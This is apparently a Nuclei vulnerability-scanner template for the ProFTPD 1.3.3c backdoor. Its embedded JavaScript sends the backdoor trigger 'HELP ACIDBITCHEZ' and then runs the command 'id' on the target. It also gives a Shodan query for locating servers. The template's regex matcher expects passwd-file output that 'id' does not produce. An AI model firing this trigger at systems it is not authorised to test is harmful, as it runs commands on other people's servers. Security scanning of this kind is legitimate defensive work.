id: proftpd-backdoor

info:
  name: ProFTPd-1.3.3c - Backdoor Command Execution
  author: pussycat0x
  severity: critical
  description: |
    This backdoor was present in the proftpd-1.3.3c.
  reference:
    - https://github.com/shafdo/ProFTPD-1.3.3c-Backdoor_Command_Execution_Automated_Script/blob/main/README.md
    - https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_133c_backdoor/
  metadata:
    max-request: 1
    shodan-query: "product:\"ProFTPD\""
  tags: js,network,proftpd,ftp,backdoor

javascript:
  - pre-condition: |
      isPortOpen(Host,Port);
    code: |
      const data = ["HELP ACIDBITCHEZ\n", "id"];
      const c = require("nuclei/net");
      let conn = c.Open('tcp', `${Host}:${Port}`);
      let resp = conn.RecvFullString();
      if (resp.includes("ProFTPD 1.3.3c"))
      {
        for (let i = 0; i < data.length; i++)
          {
          conn.Send(data[i]);
          console.log('Sending:', data[i]);
          let resp = conn.RecvFullString();
          resp
      }
        } else
        {
      exit();
        }

    args:
      Host: "{{Host}}"
      Port: 21

    matchers:
      - type: dsl
        dsl:
          - "success == true"

      - type: regex
        regex:
          - "root:.*:0:0:"
# digest: 4a0a004730450220393083303017583492ef7866eb600a3ee36d643e1d6722727a2a7447acb330a7022100fc15f20efb945a6fa9567a54a502114c8cd6b72713d207b3ea8a2e7bf6d625b7:922c64590222798bb761d5b6d8e72950